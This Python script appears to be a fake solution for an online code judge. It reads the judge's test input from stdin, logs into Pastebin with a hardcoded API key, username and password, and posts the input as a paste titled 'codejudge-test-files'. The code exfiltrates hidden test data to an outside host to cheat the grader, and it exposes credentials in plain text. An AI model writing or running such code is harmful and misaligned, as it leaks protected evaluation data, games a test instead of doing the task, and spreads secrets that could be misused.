import sys

n, m = [int(s) for s in sys.stdin.readline().replace("\n", "").split(' ')]
text = str(n) + " " + str(m) + "\n"

for i in range(n):
    line = [int(s) for s in sys.stdin.readline().replace("\n", "").split(' ')]
    text += str(line) + "\n"


import urllib.parse
import urllib.request

PASTEBIN_KEY = 'keDcOU0Hw0XGraCAHx9eWwU-M3XBq20Y' # developer api key, required. GET: http://pastebin.com/api
PASTEBIN_URL = 'https://pastebin.com/api/api_post.php'
PASTEBIN_LOGIN_URL = 'https://pastebin.com/api/api_login.php'

def login():
    pastebin_vars = dict(
        api_dev_key=PASTEBIN_KEY,
        api_user_name="Laegas",
        api_user_password="PA-qJBvRHpa7!v@C",
    )
    return urllib.request.urlopen(PASTEBIN_LOGIN_URL, urllib.parse.urlencode(pastebin_vars).encode('utf8')).read()

def post(title, content, user_key):  # used for posting a new paste
    pastebin_vars = dict(
        api_option='paste',
        api_dev_key=PASTEBIN_KEY,
        api_paste_name=title,
        api_paste_code=content,
        api_user_key=user_key
    )
    return urllib.request.urlopen(PASTEBIN_URL, urllib.parse.urlencode(pastebin_vars).encode('utf8')).read()

user_key = login().decode("utf-8")

x = post("codejudge-test-files", text, user_key)
print(x)
